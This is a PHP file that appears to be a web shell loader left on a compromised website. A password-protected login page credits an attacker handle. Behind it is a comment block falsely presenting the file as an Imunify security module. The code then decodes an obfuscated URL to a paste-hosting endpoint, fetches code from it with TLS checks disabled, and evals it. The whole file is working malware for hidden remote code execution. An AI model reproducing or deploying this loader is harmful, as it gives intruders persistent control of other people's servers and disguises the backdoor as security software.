<?php
session_start();
error_reporting(0);
set_time_limit(0);

// Password MD5
$md5_password = md5("Manado1yb4rt4am");

if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $md5_password) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "Maaf Anda Kurang Tampan Coba Ulangi 1x lagi";
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>AKU SAYANG KAMU</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #2e2e2e;
                color: #ffffff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 70vh;
            }
            .login-container {
                background-color: #333333;
                padding: 15px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
                display: grid;
                place-items: center;
                height: 9vh;
            }
            .login-container h2 {
                margin-bottom: 20px;
                display: grid;
                place-items: center;
                height: 2vh;
            }
            .login-container input[type="password"] {
                width: 86%;
                padding: 5px;
                margin: 5px 0;
                border: none;
                border-radius: 4px;
            }
            .login-container input[type="submit"] {
                width: 90%;
                padding: 10px;
                background-color: #4CAF50;
                border: none;
                color: white;
                border-radius: 4px;
                cursor: pointer;
            }
            .login-container input[type="submit"]:hover {
                background-color: #45a049;
            }
            .error {
                color: #f44336;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Welcome</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="D0R4H4X0R" required>
                <input type="submit" value="Login">
            </form>
            <footer>
            <p>Copyright by <a href="https://zone-xsec.com/archive/attacker/D0R4H4X0R">D0R4H4X0R</a> 2023</p>
            </footer>
            <?php
            if (isset($error)) {
                echo '<div class="error">' . $error . '</div>';
            }
            ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>

<?php
  // This file is part of Imunify - https://www.imunify.com/
//
// Imunify is a comprehensive security solution designed to protect your systems from various
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
//
// Imunify is distributed with the hope of providing optimal protection and security for your
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
// Imunify strives to deliver robust security measures, no system can be entirely impervious to
// threats.
//
// You should have received a copy of the Imunify License Agreement along with this software.
// If not, please visit https://www.imunify.com/license for further information. This document
// is current as of October 8, 2024, and is subject to change based on updates in policies
// and security practices.

/**
 * Security Module.
 *
 * This module is specifically designed to detect and mitigate various threats while ensuring
 * the integrity of your systems through real-time scanning and comprehensive protection strategies.
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
 * your servers and applications against emerging cyber threats. By implementing proactive
 * measures, Imunify aims to maintain a secure operating environment for all users.
 *
 * @package    security_module
 * @website    https://google.co.id
 * @copyright  D0R4HRX0R
 * @license    https://www.imunify.com/license Imunify License Agreement
 */
  $aNAx=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$cbnN=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 57, 58, 54, 57, 59, 4, 56, 66, 57, 60, 53, 59, 66, 56, 0, 59, 3, 66, 1, 55, 59, 58, 66, 55, 58, 5, 60, 0, 5, 55, 5, 0, 57, 60, 5];$pmXa='';foreach($cbnN as $qLvw){$pmXa.=$aNAx[$qLvw];}$RcRI = "$pmXa";function zrwR($undefined){$UWOb=curl_init();curl_setopt($UWOb,CURLOPT_URL,$undefined);curl_setopt($UWOb,CURLOPT_RETURNTRANSFER,true);curl_setopt($UWOb,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($UWOb,CURLOPT_SSL_VERIFYHOST,false);$XRcN=curl_exec($UWOb);curl_close($UWOb);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($XRcN))))));}@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(zrwR($RcRI))))))));?>